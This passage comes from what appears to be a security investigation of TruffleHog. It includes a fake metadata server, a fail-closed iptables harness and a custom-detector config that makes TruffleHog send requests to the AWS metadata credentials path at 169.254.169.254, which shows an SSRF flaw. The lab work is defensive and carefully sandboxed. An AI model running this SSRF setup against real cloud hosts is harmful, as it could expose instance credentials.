        l = min(int(self.headers.get("Content-Length", 0) or 0), 1 << 20)
        body = self.rfile.read(l) if l else b""
        with open(LOG, "a") as fh:
            fh.write(json.dumps({"method": self.command, "path": self.path,
                                 "ua": self.headers.get("User-Agent"),
                                 "metadata_hdr": self.headers.get("Metadata"),
                                 "body": body[:4096].decode("utf-8", "replace")}) + "\n")
        self.send_response(200); self.send_header("Content-Length", str(len(FAKE)))
        self.end_headers(); self.wfile.write(FAKE)
    def do_POST(self): self._h()
    def do_GET(self): self._h()
    def log_message(self, *a): pass
class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True; allow_reuse_address = True; request_queue_size = 128
if __name__ == "__main__":
    s = S((HOST, PORT), H)
    open(READY, "w").write("ready\n")
    s.serve_forever()
```

**`q1_metadata_failclosed_iptables.sh`** — the fail-closed `169.254.169.254` harness that produced Q1.f-2. A filter-table `DROP` for the metadata IP is installed **first** (real IMDS unreachable by default); a nat `REDIRECT` then diverts that traffic to the loopback synthetic fake; a preflight `curl` must hit the `FAKE-SYNTHETIC-LAB-ONLY` sentinel or the run **aborts before TruffleHog starts**; a trap removes both rules on any exit and prints the remaining-rule counts (expect 0):

```bash
#!/usr/bin/env bash
# FAIL-CLOSED 169.254.169.254 dispatch proof via iptables.
#   1. filter OUTPUT DROP for -d 169.254.169.254 --dport 80 is installed FIRST
#      (fail-closed default: real IMDS is unreachable).
#   2. nat OUTPUT REDIRECT --to-ports <mock> sends that traffic to a loopback
#      fake instead. nat OUTPUT runs before filter OUTPUT and rewrites the dest
#      to 127.0.0.1, so the DROP never matches redirected packets; if the
#      REDIRECT is ever absent, the DROP blocks the packet (fail-closed).
#   3. A preflight curl must hit the SYNTHETIC fake; otherwise we ABORT before
#      trufflehog runs.
#   4. A trap removes BOTH rules on any exit. Packet counters prove the rule fired.
set -u
MOCKPORT=$(( 18100 + ( ${CLONE_INDEX:-0} * 200 ) + 60 ))
LOG=/tmp/lab/logs/q16_imds.log; READY=/tmp/lab/logs/q16_imds.ready
: > "$LOG"; rm -f "$READY"
MOCK=""

teardown(){
  iptables -t nat -D OUTPUT -d 169.254.169.254 -p tcp --dport 80 -j REDIRECT --to-ports "$MOCKPORT" 2>/dev/null || true
  iptables       -D OUTPUT -d 169.254.169.254 -p tcp --dport 80 -j DROP 2>/dev/null || true
  [ -n "$MOCK" ] && kill "$MOCK" 2>/dev/null || true
  [ -n "$MOCK" ] && wait "$MOCK" 2>/dev/null || true
  echo "=== teardown: rules removed; verify none remain ==="
  echo "-- filter OUTPUT (169.254 rule count, expect 0) --"; iptables -S OUTPUT | grep -c '169.254.169.254' || true
  echo "-- nat OUTPUT (169.254 rule count, expect 0) --"; iptables -t nat -S OUTPUT | grep -c '169.254.169.254' || true
}
trap teardown EXIT INT TERM

# Step 1: fail-closed DROP FIRST
iptables -A OUTPUT -d 169.254.169.254 -p tcp --dport 80 -j DROP
# Step 2: REDIRECT to loopback fake
iptables -t nat -A OUTPUT -d 169.254.169.254 -p tcp --dport 80 -j REDIRECT --to-ports "$MOCKPORT"
echo "=== rules installed (DROP fail-closed + REDIRECT to 127.0.0.1:$MOCKPORT) ==="
iptables -S OUTPUT | grep 169.254 | sed 's/^/  filter: /'
iptables -t nat -S OUTPUT | grep 169.254 | sed 's/^/  nat: /'

# Step 3: start SYNTHETIC fake on loopback:MOCKPORT
python3 /tmp/lab/fake_imds.py 127.0.0.1 "$MOCKPORT" "$LOG" "$READY" >/tmp/lab/logs/q16_imds.err 2>&1 &
MOCK=$!
for i in $(seq 1 50); do [ -s "$READY" ] && break; sleep 0.1; done
[ -s "$READY" ] || { echo "ABORT: fake not ready"; exit 4; }

# Step 4: PREFLIGHT - must hit synthetic fake
PRE=$(curl -s --max-time 3 http://169.254.169.254/preflight)
echo "=== preflight: curl http://169.254.169.254/preflight ==="; echo "  $PRE"
case "$PRE" in
  *FAKE-SYNTHETIC-LAB-ONLY*) echo "  preflight OK -> interception confirmed, safe to proceed";;
  *) echo "ABORT: preflight did NOT hit the synthetic fake; refusing to run trufflehog"; exit 5;;
esac
: > "$LOG"  # clear preflight line; log will show only trufflehog's request

# packet counter BEFORE trufflehog
CNT_BEFORE=$(iptables -t nat -L OUTPUT -n -v -x | awk '/169.254.169.254/{print $1}')
echo "=== nat REDIRECT packet count BEFORE trufflehog: ${CNT_BEFORE:-0} ==="

# Step 5: run trufflehog at the EXACT user address via canonical entry point
cat > /tmp/lab/cfg/q16.yaml <<YAML
detectors:
  - name: MetadataSSRFDetector
    keywords: [labtok]
    regex: { theToken: 'labtok_[a-z0-9]{6}' }
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        unsafe: true
        headers: ["Metadata: true"]
YAML
printf 'labtok_aaa111\n' > /tmp/lab/targets/q16.txt
echo "=== trufflehog output ==="
/tmp/lab/th filesystem --no-update --json --config=/tmp/lab/cfg/q16.yaml /tmp/lab/targets/q16.txt 2>/dev/null \
  | python3 -c "
import sys,json
for ln in sys.stdin:
    ln=ln.strip()
    if ln[:1]=='{':
        try:d=json.loads(ln)
        except:continue
        if 'Verified' in d:
            r=d.get('ExtraData',{}).get('response','')
            print('  Verified=%s'%d['Verified']); print('  echoed_response(len=%d): %s'%(len(r),r))
"
# packet counter AFTER
CNT_AFTER=$(iptables -t nat -L OUTPUT -n -v -x | awk '/169.254.169.254/{print $1}')
echo "=== nat REDIRECT packet count AFTER trufflehog: ${CNT_AFTER:-0} (delta proves TruffleHog targeted 169.254.169.254) ==="
echo "=== request captured at fake standing in for 169.254.169.254 ==="
sed 's/^/  /' "$LOG"
```

**Repository-integrity proof.** The source tree is left byte-for-byte unchanged; the only file this task adds is this document. Rather than embed a volatile working-HEAD short hash — which advances every time this document is committed and therefore cannot be reproduced afterward — the checks below are **durable**: they hold on any committed revision that contains this document, because the only path that ever differs from the frozen baseline `e42153d44a5e` is the deliverable itself.

```
$ git -C <checkout> status --porcelain
# (no output) → working tree clean; no source file created, edited, or deleted
$ git -C <checkout> diff e42153d44a5e --name-status
A	blitzy/documentation/trufflehog_e42153d44a5e.md
$ git -C <checkout> merge-base --is-ancestor e42153d44a5e HEAD && echo "e42153d44a5e is an ancestor of HEAD"
e42153d44a5e is an ancestor of HEAD
```

The frozen baseline `e42153d44a5e` is a permanent ancestor of every revision on this branch, so the single-path `diff … --name-status` and the empty `status --porcelain` above reproduce on any committed revision of the document; only the working-HEAD short hash advances with each commit, making it an investigation-time snapshot rather than a fixed reproducible value. The only file added by this task is this document, `blitzy/documentation/trufflehog_e42153d44a5e.md`.

---

## External references

These external sources were used to benchmark the **observed** behavior against documented expectations; they are not a substitute for the runtime evidence above.

- **Go `regexp` linear-time / RE2.** Go's package documentation states the implementation "is guaranteed to run in time linear in the size of the input" and that its syntax "is the syntax accepted by RE2" — `https://pkg.go.dev/regexp`. The RE2 project confirms the relationship this document relies on: "The Go regexp package and Rust regex crate do not share code with RE2, but they follow the same principles, accept the same syntax, and provide the same efficiency guarantees," and that constructs requiring backtracking — "backreferences … and generalized assertions" — are excluded — `https://github.com/google/re2/wiki/Syntax` and the RE2 project README. (Supports Q5: Go stdlib `regexp` is RE2-*syntax*, linear-time, and not a separately linked C++ library.)
- **Go `net/http` redirect behavior.** The `net/http` docs and `client.go` state that "a 301, 302, or 303 redirect causes subsequent requests to use HTTP method GET … with no body," while "a 307 or 308 redirect preserves the original HTTP method and body," and that sensitive headers such as `Authorization` "are retained on redirect to a subdomain or to a different scheme on the same host" (stripped cross-domain) — `https://pkg.go.dev/net/http` and `https://go.dev/src/net/http/client.go`. (Supports Q2 Condition D: same-host `307/308` `HTTPS→HTTP` re-sends the body and `Authorization` over cleartext.)
- **AWS EC2 Instance Metadata Service.** IMDSv1 is a bare request/response `GET`; IMDSv2 requires a `PUT` to `http://169.254.169.254/latest/api/token` (with `X-aws-ec2-metadata-token-ttl-seconds`) to obtain a token that must accompany subsequent `GET`s, and IAM credentials live under `/latest/meta-data/iam/security-credentials/<role>` — `https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html` and `.../instance-metadata-security-credentials.html`. (Supports Q1: a fixed `POST` cannot complete the IMDSv2 token exchange, so credential theft is not turnkey against IMDSv2; the SSRF *dispatch* and 200-byte readback remain real.)
- **SSRF prevention.** OWASP's guidance is to prefer an allowlist ("Deny-lists are bypass-prone. Prefer allow-lists"), to block internal/reserved and cloud-metadata ranges, to resolve the hostname to its final IP before validation, and to disable redirect-following to prevent validation bypass — OWASP SSRF Prevention Cheat Sheet (`https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html`) and OWASP Top 10 A10:2021 (`https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_(SSRF)/`). (Frames Q1/Q6: TruffleHog's custom-detector webhook path implements none of these destination checks.)
